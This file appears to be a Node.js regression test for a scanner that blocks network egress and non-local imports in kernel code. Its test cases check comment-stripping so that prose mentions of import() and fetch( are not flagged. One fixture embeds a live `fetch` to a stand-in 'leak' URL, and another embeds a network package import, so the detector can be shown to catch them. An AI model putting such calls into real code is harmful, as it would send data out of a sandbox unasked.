#!/usr/bin/env node
// gate-zero-egress-comment.test.mjs — regression fixtures for the comment-stripping fix.
//
// Pins the EGRESS-SCANNER-COMMENT-1 fix: a `//` or `/* */` comment that merely QUOTES a
// non-local import specifier or a forbidden network call (prose explaining a failure mode,
// as art-336's kernel does) must NOT trip the gate — but a real one, sitting in live code
// (including one built entirely out of a comment-adjacent line), still must.
//
// Run: node scripts/gate-zero-egress-comment.test.mjs   (exit 0 = all green)

import { stripComments, FORBIDDEN, NONLOCAL_IMPORT } from './gate-zero-egress.mjs';

let fail = 0;
function findings(src) {
  const stripped = stripComments(src);
  const out = [];
  for (const f of FORBIDDEN) if (f.re.test(stripped)) out.push(f.name);
  NONLOCAL_IMPORT.lastIndex = 0;
  let m;
  while ((m = NONLOCAL_IMPORT.exec(stripped))) out.push(`non-local import("${m[1]}")`);
  return out;
}
function expectClean(label, src) {
  const f = findings(src);
  if (f.length) { fail++; console.error(`✗ ${label} — expected CLEAN, got: ${f.join(', ')}`); }
  else console.log(`✓ ${label} — clean`);
}
function expectFlagged(label, src, needle) {
  const f = findings(src);
  if (!f.some((x) => x.includes(needle))) { fail++; console.error(`✗ ${label} — expected a finding containing "${needle}", got: ${f.join(', ') || '(none)'}`); }
  else console.log(`✓ ${label} — flagged (${f.join(', ')})`);
}

// 1. The exact false positive: art-336's real comment, quoting a failure message that itself
//    names an import() and a module file. This is the reproduced RED case from the live kernel.
const art336Comment = `
// MEASURED, 2026-07-25 (S18-ART336-FIX-1): a dynamic \`import('./_hash.mjs')\` inside
// rejects the dynamic import ("could not load module '_hash.mjs'"), so the shape this
// is computed. Pinned by a self-check vector, verified against _hash.mjs's own cgCanon.
export function compute(input) { return input; }
`;
expectClean('art-336 prose comment (line // style)', art336Comment);

// 2. Same trap in a /* */ block comment.
const blockComment = `
/* rejects the dynamic import("could not load module '_hash.mjs'") at runtime */
export function compute(input) { return input; }
`;
expectClean('prose in a /* */ block comment', blockComment);

// 3. A string literal containing "//" must survive comment-stripping untouched — this is the
//    trap the fix must not fall into (a naive stripper would eat the rest of the line).
const urlLiteral = `
export const LABEL = "see https://example.com/docs for context";
export function compute(input) { return input; }
`;
expectClean('string literal containing "//" (URL)', urlLiteral);

// 4. A REAL non-local dynamic import() sitting in live code (not a comment) must still be caught.
const realDynamicImport = `
export async function compute(input) {
  const mod = await import('some-network-package');
  return mod.run(input);
}
`;
expectFlagged('real non-local dynamic import() in live code', realDynamicImport, 'non-local import');

// 5. A REAL fetch() call in live code must still be caught, even sitting right next to a comment
//    that also mentions fetch( in prose (proves the two don't cancel each other out).
const realFetchNextToComment = `
// note: this kernel does not call fetch( — see the design doc
export function compute(input) {
  fetch('https://example.invalid/leak');
  return input;
}
`;
expectFlagged('real fetch( in live code beside a fetch(-mentioning comment', realFetchNextToComment, 'fetch(');

console.log(fail ? `\n${fail} check(s) FAILED` : '\nall checks green');
process.exit(fail ? 1 : 0);
